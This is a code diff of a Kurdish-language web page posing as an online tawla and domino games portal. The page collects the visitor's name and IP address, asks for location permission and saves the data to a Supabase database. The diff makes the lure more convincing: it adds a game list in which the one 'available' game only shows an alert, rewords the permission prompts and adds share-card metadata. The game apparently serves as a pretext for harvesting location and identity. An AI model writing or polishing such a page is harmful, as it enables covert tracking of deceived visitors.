@@ -8,7 +8,7 @@
   <!-- Open Graph Meta Tags -->
   <meta property="og:title" content="یارییە کوردییەکان - تاوڵە و دۆمینەی ئۆنلاین">
   <meta property="og:description" content="یاری ئۆنلاین لەگەڵ هاوڕێکانت بکە بە بێ داگرتن">
-  <meta property="og:image" content="https://yoursite.com/game-cover.jpg">
+  <meta property="og:image" content="https://images.unsplash.com/photo-1610890716171-6b1bb98ffd09?q=80&w=1000">
   <meta property="og:type" content="website">
 
   <title>یارییە کوردییەکان</title>
@@ -69,9 +69,10 @@
       margin-bottom: 20px;
     }
 
-    #languageScreen {
-      display: block;
-    }
+    /* Screens */
+    #languageScreen { display: block; }
+    #nameScreen { display: none; }
+    #gameScreen { display: none; }
 
     .language-buttons {
       display: flex;
@@ -100,10 +101,6 @@
     .language-btn.active {
       background: var(--blue);
       border-color: var(--blue);
-    }
-
-    #nameScreen {
-      display: none;
     }
 
     input[type="text"] {
@@ -182,15 +179,49 @@
       color: white;
     }
 
-    @media (max-width: 480px) {
-      .card {
-        padding: 24px 20px;
-      }
+    /* Game Selection Styles */
+    .game-list {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 20px;
+    }
 
-      .language-buttons,
-      .btn-group {
-        flex-direction: column;
-      }
+    .game-item {
+      padding: 15px;
+      border-radius: 10px;
+      border: 1px solid var(--border);
+      background: var(--input);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .game-item.active:hover {
+      border-color: var(--blue);
+      background: var(--gray);
+    }
+
+    .game-item.disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .badge {
+      font-size: 11px;
+      padding: 3px 8px;
+      border-radius: 12px;
+      font-weight: bold;
+    }
+
+    .badge-green { background: #166534; color: #4ade80; }
+    .badge-yellow { background: #854d0e; color: #fef08a; }
+
+    @media (max-width: 480px) {
+      .card { padding: 24px 20px; }
+      .language-buttons, .btn-group { flex-direction: column; }
     }
   </style>
 </head>
@@ -199,7 +230,7 @@
 
   <div class="card">
 
-    <!-- LANGUAGE SELECTION -->
+    <!-- 1. LANGUAGE SELECTION -->
     <div id="languageScreen">
       <h2>زمانەکەت هەڵبژێرە / Choose your language</h2>
       <p>تکایە زمانەکەت هەڵبژێرە / Please choose your language</p>
@@ -209,21 +240,48 @@
       </div>
     </div>
 
-    <!-- NAME + LOCATION -->
+    <!-- 2. NAME INPUT & LOCATION -->
     <div id="nameScreen">
       <h2 id="title">چونەژوورەوە</h2>
-      <p id="description">ناوت تۆمار بکە.</p>
+      <p id="description">ناوت تۆمار بکە بۆ چوونە ناو یاریگە.</p>
 
       <input type="text" id="username" placeholder="ناوەکەت بنووسە..." autocomplete="name">
 
       <div class="btn-group">
-        <button type="button" class="action-btn" id="allow">یاری کردن</button>
+        <button type="button" class="action-btn" id="allow">بەردەوامبوون</button>
         <button type="button" class="action-btn" id="deny">ڕەتکردنەوە</button>
       </div>
 
       <div id="result"></div>
 
       <button type="button" class="change-language" id="changeLanguage">گۆڕینی زمان</button>
+    </div>
+
+    <!-- 3. GAME SELECTION SCREEN -->
+    <div id="gameScreen">
+      <h2 id="gameTitle">لیستی یارییەکان</h2>
+      <p id="welcomeUser" style="color: var(--blue); font-weight: bold;"></p>
+      <p id="gameDesc">ئەو یارییە هەڵبژێرە کە دەتەوێت ئەنجامی بدەیت:</p>
+
+      <div class="game-list">
+        <!-- Tawla Game (Active) -->
+        <div class="game-item active" id="tawlaOption">
+          <span style="font-size: 16px; font-weight: bold;">🎲 یاری تاوڵە</span>
+          <span class="badge badge-green">بەردەستە</span>
+        </div>
+
+        <!-- Domino (Disabled) -->
+        <div class="game-item disabled">
+          <span>🀄 یاری دۆمینە</span>
+          <span class="badge badge-yellow">بەم زووانە</span>
+        </div>
+
+        <!-- Konkan (Disabled) -->
+        <div class="game-item disabled">
+          <span>🃏 یاری کۆنکان</span>
+          <span class="badge badge-yellow">بەم زووانە</span>
+        </div>
+      </div>
     </div>
 
   </div>
@@ -237,10 +295,10 @@
 
     const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    const SUCCESS_IMAGE_URL = "https://i.ibb.co/m58yfTHK/IMG-3457.jpg";
-
     const languageScreen = document.getElementById("languageScreen");
     const nameScreen = document.getElementById("nameScreen");
+    const gameScreen = document.getElementById("gameScreen");
+
     const kurdishBtn = document.getElementById("kurdishBtn");
     const englishBtn = document.getElementById("englishBtn");
     const title = document.getElementById("title");
@@ -250,23 +308,23 @@
     const denyButton = document.getElementById("deny");
     const result = document.getElementById("result");
     const changeLanguage = document.getElementById("changeLanguage");
+    const welcomeUser = document.getElementById("welcomeUser");
 
     const translations = {
       ku: {
         direction: "rtl",
         title: "چونەژوورەوە",
-        description: "ناوت تۆمار بکە.",
+        description: "ناوت تۆمار بکە بۆ دەستپێکردن.",
         placeholder: "ناوەکەت بنووسە...",
-        allow: "یاری کردن",
+        allow: "بەردەوامبوون",
         deny: "ڕەتکردنەوە",
         change: "گۆڕینی زمان",
         emptyName: "❌ تکایە پێشتر ناوەکەت بنووسە!",
         noLocation: "❌ پێگەڕەکەت پشتیوانی وەرگرتنی شوێن ناکات.",
-        requesting: "⏳ داواکاری زانیارییەکان دەکرێت...",
+        requesting: "⏳ پەیوەستبوون بە سێرڤەر...",
         saving: "⏳ زانیارییەکان تۆمار دەکرێن...",
-        success: "✅ بە سەرکەوتوویی ئەنجامتدا!",
-        databaseError: "⚠️ زانیارییەکان تۆمار نەکرا!",
-        permissionDenied: "❌  ڕێگەپێدانی یاریکردن ڕەتکرایەوە. تکایە دوبارە چونەژورەوە بکەوە Allow بکە.",
+        databaseError: "⚠️ زانیارییەکان تۆمار نەکرا، تکایە دووبارە هەوڵبدەرەوە.",
+        permissionDenied: "❌ دەستگەیشتن ڕەتکرایەوە. تکایە Allow بکە بۆ چوونەژوورەوە.",
         unavailable: "❌ زانیاری شوێنەکەی بەردەست نییە.",
         timeout: "❌ کاتی بەسەرچوو.",
         unknown: "❌ هەڵەیەکی نەزانراو ڕووی دا.",
@@ -275,19 +333,18 @@
       en: {
         direction: "ltr",
         title: "Access",
-        description: "Please enter your name and click Continue.",
+        description: "Enter your name to continue.",
         placeholder: "Enter your name...",
         allow: "Continue",
         deny: "Cancel",
         change: "Change language",
         emptyName: "❌ Please enter your name first!",
         noLocation: "❌ Your browser does not support location services.",
-        requesting: "⏳ Requesting info...",
+        requesting: "⏳ Connecting to server...",
         saving: "⏳ Saving data...",
-        success: "✅ Successfully done!",
         databaseError: "⚠️ Could not save to database.",
-        permissionDenied: "❌ playing permission denied refresh and Allow.",
-        unavailable: "❌ playing unavailable.",
+        permissionDenied: "❌ Permission denied. Please Allow to continue.",
+        unavailable: "❌ Location unavailable.",
         timeout: "❌ Request timed out.",
         unknown: "❌ Unknown error occurred.",
         cancelled: "Cancellation selected."
@@ -322,7 +379,7 @@
         const data = await response.json();
         return data.ip;
       } catch (err) {
-        return "Unkown IP";
+        return "Unknown IP";
       }
     }
 
@@ -390,16 +447,10 @@
               return;
             }
 
-            result.innerHTML = `
-              <div style="text-align: center; margin-top: 15px;">
-                <p style="color:#22c55e; font-weight: bold; margin-bottom: 10px;">${t.success}</p>
-                <img 
-                  src="${SUCCESS_IMAGE_URL}" 
-                  alt="Success Photo" 
-                  style="width: 100%; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.4);" 
-                />
-              </div>
-            `;
+            // پەڕەی هەڵبژاردنی یارییەکان بکەرەوە دوای سەرکەوتن
+            nameScreen.style.display = "none";
+            gameScreen.style.display = "block";
+            welcomeUser.textContent = `بەخێربێیت ${name}!`;
 
           } catch (error) {
             console.error("Unexpected error:", error);
@@ -438,6 +489,11 @@
     denyButton.addEventListener("click", function () {
       const t = translations[currentLanguage];
       result.innerHTML = `<span style="color:#94a3b8;">${t.cancelled}</span>`;
+    });
+
+    // کلیک لەسەر تاوڵە (لێرەدا دەتوانیت بیبەستیتەوە بە ڕومێکی تاوڵە)
+    document.getElementById("tawlaOption").addEventListener("click", function() {
+      alert("چوونەژوورەوە بۆ یاری تاوڵە... (دەتواتیت ئاڕاستەی لاپەڕەی تاوڵەکەی بکەیت)");
     });
 
     setLanguage("ku");
